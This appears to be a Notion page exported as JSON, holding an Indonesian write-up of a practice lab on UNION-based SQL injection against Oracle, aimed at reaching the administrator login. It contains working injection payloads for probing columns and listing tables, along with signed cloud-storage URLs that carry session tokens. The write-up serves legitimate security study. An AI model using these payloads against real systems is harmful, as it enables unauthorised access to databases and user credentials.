@@ -1,0 +1,1840 @@
+{
+  "meta": {
+    "generated_at": "2025-09-18T01:38:52.402Z",
+    "notion_api_version": "2022-06-28",
+    "includes_content": true,
+    "folder": "day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197",
+    "slug": "day-9-lab-sql-injection-attack-listing-the-databas",
+    "og_image": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-1.png",
+    "featured_image": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-1.png"
+  },
+  "post": {
+    "id": "25cdb469-a81d-8058-aa2d-ee98ac891197",
+    "created_time": "2025-08-27T13:20:00.000Z",
+    "last_edited_time": "2025-08-27T15:31:00.000Z",
+    "url": "https://www.notion.so/Day-9-Lab-SQL-injection-attack-listing-the-database-contents-on-Oracle-25cdb469a81d8058aa2dee98ac891197",
+    "public_url": null,
+    "archived": false,
+    "icon": null,
+    "cover": null,
+    "properties": {
+      "description": "",
+      "createdtime": {
+        "id": "Abyx",
+        "type": "created_time",
+        "created_time": "2025-08-27T13:20:00.000Z"
+      },
+      "slug": "day-9-lab:-sql-injection-attack,-listing-the-database-contents-on-oracle",
+      "publisheddate": null,
+      "owner": [
+        {
+          "id": "ac3d6ce8-4cb1-4c2d-a068-480495e731ed"
+        }
+      ],
+      "featured_image": [],
+      "tags": [],
+      "published": false,
+      "title": "Day 9 Lab: SQL injection attack, listing the database contents on Oracle"
+    },
+    "title": "Day 9 Lab: SQL injection attack, listing the database contents on Oracle",
+    "content": [
+      {
+        "id": "25cdb469-a81d-80fe-8d56-d620edecded7",
+        "type": "image",
+        "created_time": "2025-08-27T13:22:00.000Z",
+        "last_edited_time": "2025-08-27T13:23:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-1.png",
+          "expiry_time": "2025-09-18T02:38:47.270Z",
+          "localUrl": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-1.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/5988337a-cf0a-42e8-8f63-6ba673c09521/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663COH4ZUY%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIHnxgj8bjnZBF8yKUPsadN3%2BJyIRCZyNHT21DkqeIZv2AiAWJbz%2FbOENbuYyRaCBYPnn5mVv%2F54FUYtHwmyono1L5iqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMxG4%2B3Ni3byWE0Q7JKtwDlDuMy5UIBpB96TmayQwk91eI3wPp34sCNphOJCEYwttYEInhAYLLphSbUdA3QyalfcVu9D6UxgJLfwAqfqq5A%2B6vuW6SOp4qs63DyjndUFLkxCnm4k5RbWXtrh4fEwChR%2F1yQ8IAG5zR7tL%2FFYHkvpbmzo8wHu6W7Hmsrf8ps7bGXjOHJXJ1e3CyX6WN1EtJlexAcKjFiEH8WbfLP0%2Bv9v35OV48V5D5bnHOWBIOb4ZScPyo%2BGUUb8LzD2LhWVX6P%2B3Y7%2B4Rx5XKWB8tq%2FrsD%2FCKPX5vw8VTeUHCO56cn2fw%2FgyPxG7tNbQbRI0YdR2KHjOmVeNEroHloWsuICs0a8b%2FdkDa9H%2FCqERfys7lLcDcUY36IgN8o3Nm3RUUhHZHR0%2BJIsGamojjWL2nckg%2FRtJyhGym1qKHV4%2FJV%2FRd%2BJCVeXKbDTfgRXPzvglfluYvUab3SZk1KX2VF%2FpJYiVNLRdGnfiWiIHW43i6FaxZADWILY6ppkonPoAW8AxNx5Oa2j9APEL8577zAoPvkxNgc9UHybjWk3FIjhcO7jS3qxqd9W%2Fy3XszTP1g91YCHB1FxlCjtOkD969Z8cAOvvzeJvdb93m9Ey41Nr54118eOmUVdwV9kYGRXuy868ww4ZitxgY6pgGWBGkvquDHE0cie1dcBvWgU9Wzk0GRIzMbs%2FFR0v0MMYoap6lafAUVW3bxbGuFJ2h74%2B8j8pnASZ9zLB5hazCzUyVVg2w6bhXIbXwEwl%2BacfGPwUOsfQ7Rgoh03suQFfNzVwd8TleUB6H6gbawhtRpkei3rqU%2BMcaX24nKs44sXN6JoueFvaBKmRzBy6fQaObYLB8LCFJf2MWKv16xH1UB3L0VbXlO&X-Amz-Signature=e9c5981c2299653be40c646bba9f881c29867fa1f757a5658e256de43510889a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80b5-ac57-fc2d0eece58d",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8017-af05-dc70ec46fd99",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Tujuan:",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " login sebagai ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "administrator",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " dengan memanfaatkan SQLi UNION pada parameter kategori (DB: Oracle).",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-802a-b5e1-c520025402ae",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Disclaimer:",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " Saya nulis catatan ini buat belajar bareng teman‑teman di lab/lingkungan yang diizinkan. Jangan dipakai ke sistem produksi orang lain ya. 🙏",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8052-81d2-e178acd0d7f4",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-804f-9c50-dc60d806d8b9",
+        "type": "divider",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {}
+      },
+      {
+        "id": "25cdb469-a81d-8047-8df9-cad8c0da3596",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80a9-89bb-d06de30526d5",
+        "type": "heading_2",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Bedanya Oracle vs yang kemarin (PostgreSQL)",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8082-9a54-e345791c00fe",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Oracle butuh tabel dummy ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "DUAL",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " saat ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "SELECT",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " tanpa sumber tabel aplikasi.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8096-baf6-d080af75c55d",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Data dictionary: ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "ALL_TABLES",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "ALL_TAB_COLUMNS",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " (bisa juga ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "USER_TABLES",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "/",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "USER_TAB_COLUMNS",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ").",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80d5-a8ce-e54abc891e11",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Nama objek disimpan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "UPPERCASE",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " di dictionary (hindari typo: gunakan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "UPPER('<nama>')",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ").",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80cf-8394-f7dd26b614c8",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "String concat pakai ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "||",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", dan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "cast ke teks",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " pakai ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "TO_CHAR(...)",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ".",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-801b-a62e-ff5a395f88d2",
+        "type": "bulleted_list_item",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Batasin baris: modern Oracle bisa ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "FETCH FIRST 1 ROWS ONLY",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", klasik pakai ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "WHERE ROWNUM <= 1",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ".",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-805d-a647-e075e930df24",
+        "type": "divider",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {}
+      },
+      {
+        "id": "25cdb469-a81d-8044-b579-c2795fad9db4",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:55:00.000Z",
+        "last_edited_time": "2025-08-27T14:55:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8093-b3db-e4851ca8a8e2",
+        "type": "paragraph",
+        "created_time": "2025-08-27T13:22:00.000Z",
+        "last_edited_time": "2025-08-27T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "\nProof of concept:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80d4-86e9-fff8e6a5eb6e",
+        "type": "paragraph",
+        "created_time": "2025-08-27T13:59:00.000Z",
+        "last_edited_time": "2025-08-27T13:59:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80a7-ae7f-fe77614bf823",
+        "type": "heading_2",
+        "created_time": "2025-08-27T13:59:00.000Z",
+        "last_edited_time": "2025-08-27T15:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "1. Cek jumlah & tipe kolom",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80c2-b97d-ee38e5ad91e0",
+        "type": "paragraph",
+        "created_time": "2025-08-27T13:22:00.000Z",
+        "last_edited_time": "2025-08-27T14:56:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Kita tebak 2 kolom teks dulu. Di Oracle, tambahkan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "FROM DUAL",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ":",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8058-b391-c53c892ea56e",
+        "type": "code",
+        "created_time": "2025-08-27T14:00:00.000Z",
+        "last_edited_time": "2025-08-27T15:09:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "'+UNION+ALL+SELECT+'xyz','test'+FROM+dual--",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "25cdb469-a81d-8023-8bc3-f62756e939e8",
+        "type": "image",
+        "created_time": "2025-08-27T15:09:00.000Z",
+        "last_edited_time": "2025-08-27T15:09:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-2.png",
+          "expiry_time": "2025-09-18T02:38:47.274Z",
+          "localUrl": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-2.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/e4ec4851-24a7-4d9e-9ac8-81c2bbf65360/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663COH4ZUY%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013847Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIHnxgj8bjnZBF8yKUPsadN3%2BJyIRCZyNHT21DkqeIZv2AiAWJbz%2FbOENbuYyRaCBYPnn5mVv%2F54FUYtHwmyono1L5iqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMxG4%2B3Ni3byWE0Q7JKtwDlDuMy5UIBpB96TmayQwk91eI3wPp34sCNphOJCEYwttYEInhAYLLphSbUdA3QyalfcVu9D6UxgJLfwAqfqq5A%2B6vuW6SOp4qs63DyjndUFLkxCnm4k5RbWXtrh4fEwChR%2F1yQ8IAG5zR7tL%2FFYHkvpbmzo8wHu6W7Hmsrf8ps7bGXjOHJXJ1e3CyX6WN1EtJlexAcKjFiEH8WbfLP0%2Bv9v35OV48V5D5bnHOWBIOb4ZScPyo%2BGUUb8LzD2LhWVX6P%2B3Y7%2B4Rx5XKWB8tq%2FrsD%2FCKPX5vw8VTeUHCO56cn2fw%2FgyPxG7tNbQbRI0YdR2KHjOmVeNEroHloWsuICs0a8b%2FdkDa9H%2FCqERfys7lLcDcUY36IgN8o3Nm3RUUhHZHR0%2BJIsGamojjWL2nckg%2FRtJyhGym1qKHV4%2FJV%2FRd%2BJCVeXKbDTfgRXPzvglfluYvUab3SZk1KX2VF%2FpJYiVNLRdGnfiWiIHW43i6FaxZADWILY6ppkonPoAW8AxNx5Oa2j9APEL8577zAoPvkxNgc9UHybjWk3FIjhcO7jS3qxqd9W%2Fy3XszTP1g91YCHB1FxlCjtOkD969Z8cAOvvzeJvdb93m9Ey41Nr54118eOmUVdwV9kYGRXuy868ww4ZitxgY6pgGWBGkvquDHE0cie1dcBvWgU9Wzk0GRIzMbs%2FFR0v0MMYoap6lafAUVW3bxbGuFJ2h74%2B8j8pnASZ9zLB5hazCzUyVVg2w6bhXIbXwEwl%2BacfGPwUOsfQ7Rgoh03suQFfNzVwd8TleUB6H6gbawhtRpkei3rqU%2BMcaX24nKs44sXN6JoueFvaBKmRzBy6fQaObYLB8LCFJf2MWKv16xH1UB3L0VbXlO&X-Amz-Signature=e7524296efcd5909efee4cd950d2881f87fa0e8f97af60c75064afaa2b039de8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-804e-97eb-d8caead3ff9e",
+        "type": "paragraph",
+        "created_time": "2025-08-27T14:01:00.000Z",
+        "last_edited_time": "2025-08-27T15:09:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Kalau error tipe data, ganti jadi ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "TO_CHAR('abc')",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "/",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "TO_CHAR(123)",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " supaya match tipe.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80a1-a659-d681ad152dc9",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:00:00.000Z",
+        "last_edited_time": "2025-08-27T15:09:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80e2-8454-ebe8fc353856",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:00:00.000Z",
+        "last_edited_time": "2025-08-27T15:09:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Kalau masih error jumlah kolom, ulangi dengan ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "(NULL)",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "(NULL,NULL,NULL)",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": ", dst., sampai cocok.",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-803a-910e-c7822dc71041",
+        "type": "heading_2",
+        "created_time": "2025-08-27T14:56:00.000Z",
+        "last_edited_time": "2025-08-27T15:04:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "2. List tabel (fokus schema aplikasi)",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default",
+          "is_toggleable": false
+        }
+      },
+      {
+        "id": "25cdb469-a81d-802d-a119-cd1a45751783",
+        "type": "paragraph",
+        "created_time": "2025-08-27T15:00:00.000Z",
+        "last_edited_time": "2025-08-27T15:00:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Biar hasilnya relevan, saya suka batasi ke owner saat ini (schema user aplikasi):",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "25cdb469-a81d-80d6-90fd-c38792621294",
+        "type": "code",
+        "created_time": "2025-08-27T14:01:00.000Z",
+        "last_edited_time": "2025-08-27T15:00:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "'+UNION+ALL+SELECT+table_name,NULL+FROM+all_tables+WHERE+owner=USER--",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "25cdb469-a81d-806b-9aeb-fadb2dbc8ccb",
+        "type": "image",
+        "created_time": "2025-08-27T15:11:00.000Z",
+        "last_edited_time": "2025-08-27T15:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-3.png",
+          "expiry_time": "2025-09-18T02:38:47.381Z",
+          "localUrl": "/posts/day-9-lab-sql-injection-attack-listing-the-databas-25cdb469a81d8058aa2dee98ac891197/image-3.png",
